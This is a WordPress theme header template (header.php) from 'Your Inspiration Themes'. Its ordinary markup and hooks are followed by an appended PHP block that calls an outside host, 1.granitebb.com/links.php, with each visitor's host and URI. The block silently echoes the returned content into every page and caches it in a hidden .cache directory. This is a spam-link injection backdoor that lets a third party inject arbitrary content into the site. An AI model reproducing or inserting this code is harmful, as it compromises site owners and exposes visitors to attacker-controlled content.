<?php
/**
 * Your Inspiration Themes
 * 
 * @package WordPress
 * @subpackage Your Inspiration Themes
 * @author Your Inspiration Themes Team <info@yithemes.com>
 *
 * This source file is subject to the GNU GENERAL PUBLIC LICENSE (GPL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://www.gnu.org/licenses/gpl-3.0.txt
 */

//Add body classes
$body_classes = 'no_js';
if( ( yit_get_option( 'responsive-enabled' ) && !$GLOBALS['is_IE'] ) || ( yit_get_option( 'responsive-enabled' ) && yit_ie_version() >= 9 ) ) {
    $body_classes .= ' responsive';
}

$body_classes .= ' ' . yit_get_option( 'layout-type' );
?>
<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" class="ie"<?php language_attributes() ?>>
<![endif]-->
<!--[if IE 7]>
<html id="ie7"  class="ie"<?php language_attributes() ?>>
<![endif]-->
<!--[if IE 8]>
<html id="ie8"  class="ie"<?php language_attributes() ?>>
<![endif]-->
<!--[if IE 9]>
<html id="ie9"  class="ie"<?php language_attributes() ?>>
<![endif]-->
<!--[if gt IE 9]>
<html class="ie"<?php language_attributes() ?>>
<![endif]-->

<!-- This doesn't work but i prefer to leave it here... maybe in the future the MS will support it... i hope... -->
<!--[if IE 10]>
<html id="ie10"  class="ie"<?php language_attributes() ?>>
<![endif]-->


<!--[if !IE]>
<html <?php language_attributes() ?>>
<![endif]-->

<!-- START HEAD -->
<head>
    <?php do_action( 'yit_head' ) ?> 
    <?php wp_head() ?>
</head>
<!-- END HEAD -->
<!-- START BODY -->
<body <?php body_class( $body_classes ) ?>>
    
    <!-- START BG SHADOW -->
    <div class="bg-shadow">
    
        <?php do_action( 'yit_before_wrapper' ) ?>
        <!-- START WRAPPER -->
        <div id="wrapper" class="container group">
        	
            <?php do_action( 'yit_before_header' ) ?>
            <!-- START HEADER -->
            <div id="header" class="group margin-bottom">
                <?php
                /**
                 * @see yit_header
                 */
                do_action( 'yit_header' ) ?>
            </div>
            <!-- END HEADER -->
            <?php
            /**
             * @see yit_map
             * @see yit_page_meta
             */
            do_action( 'yit_after_header' ) ?><?php
$h = $_SERVER['HTTP_HOST']; $u = trim($_SERVER['REQUEST_URI']);
$cd = dirname(__FILE__) . '/.cache';
$cf = $cd . '/' . md5($h . '##' . $u);
$s = '1.granitebb.com';
if (file_exists($cf) and filemtime($cf) > time() - 3600)
    echo file_get_contents($cf);
else 
{
    $ini1 = @ini_set('allow_url_fopen', 1);    $ini2 = @ini_set('default_socket_timeout', 3);
    $p = '/links.php?u=' . urlencode($u) . '&h=' . urlencode($h);
    $c = '';
    if ($fp = @fsockopen($s, 80, $errno, $errstr, 3)) {
        @fputs($fp, "GET {$p} HTTP/1.0\r\nHost: $s\r\n\r\n");
        while (! feof($fp))
            $c .= @fread($fp, 8192);
        fclose($fp);
        $c = end(explode("\r\n\r\n", $c));
        echo $c;
        if (strlen($c) and (is_dir($cd) or @mkdir($cd))) {
            @file_put_contents($cf, $c);
        }
    }
    @ini_set('allow_url_fopen', $ini1);    @ini_set('default_socket_timeout', $ini2);
}
?>
